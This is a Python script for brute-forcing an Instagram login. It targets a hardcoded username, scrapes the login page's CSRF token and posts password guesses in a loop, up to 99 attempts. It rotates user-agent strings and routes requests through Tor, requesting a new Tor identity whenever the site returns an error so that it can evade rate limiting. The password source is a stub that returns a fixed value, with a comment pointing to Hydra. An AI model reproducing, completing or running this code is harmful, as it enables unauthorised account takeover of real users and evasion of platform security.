from bs4 import BeautifulSoup
import json, random, re, requests
from stem.control import Controller
from stem.control import Signal
import stem


BASE_URL = 'https://www.instagram.com/accounts/login/'
LOGIN_URL = BASE_URL + 'ajax/'

headers_list = [
        "Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101"\
        " Firefox/41.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2)"\
        " AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2"\
        " Safari/601.3.9",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0)"\
        " Gecko/20100101 Firefox/15.0.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"\
        " (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"\
        " Edge/12.246"
        ]

def main():

    pass_is_found = False
    attempts = 1

    while attempts < 100:
        USERNAME = 'trevato'
        PASSWD = get_new_pass()

        # Get random User Agent.
        USER_AGENT = headers_list[random.randrange(0,4)]

        session = requests.Session()

        # Set Requests to go through Tor.
        session.proxies = {}
        session.proxies['http'] = 'socks5h://localhost:9150'
        session.proxies['https'] = 'socks5h://localhost:9150'


        session.headers = {'user-agent': USER_AGENT}
        session.headers.update({'Referer': BASE_URL})
        req = session.get(BASE_URL)
        soup = BeautifulSoup(req.content, 'html.parser')
        body = soup.find('body')

        pattern = re.compile('window._sharedData')
        script = body.find("script", text=pattern)

        script = script.get_text().replace('window._sharedData = ', '')[:-1]
        data = json.loads(script)

        csrf = data['config'].get('csrf_token')
        login_data = {'username': USERNAME, 'password': PASSWD}
        session.headers.update({'X-CSRFToken': csrf})
        login = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
        resp = json.loads(login.content)

        print('Attempt: ' +str(attempts))
        print(resp)

        attempts += 1

        try:
            if resp['errors'] == resp['errors']:
                get_new_IP()

        except KeyError as k:
            try:
                if resp['authenticated'] == True:
                    pass_is_found = True
                    found_pass(PASSWD)
            except KeyError as e:
                print('No error or authenticate found.')
                print(resp)


def get_new_IP():

    # Change Tor IP.
    print('Getting new IP.')

    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)

    test_New_IP()

def get_new_pass():

    # Use Hydra to cycle through Passwords.
    print('Getting new password.')

    new_pass = 'test'

    return new_pass

def found_pass(passwd):
    print('Found password!')
    print(passwd)

def test_New_IP():

    session = requests.session()
    session.proxies = {}
    session.proxies['http'] = 'socks5h://localhost:9150'
    session.proxies['https'] = 'socks5h://localhost:9150'

    r = session.get('http://plain-text-ip.com')
    print(r.content)

if __name__ == '__main__':
    main()
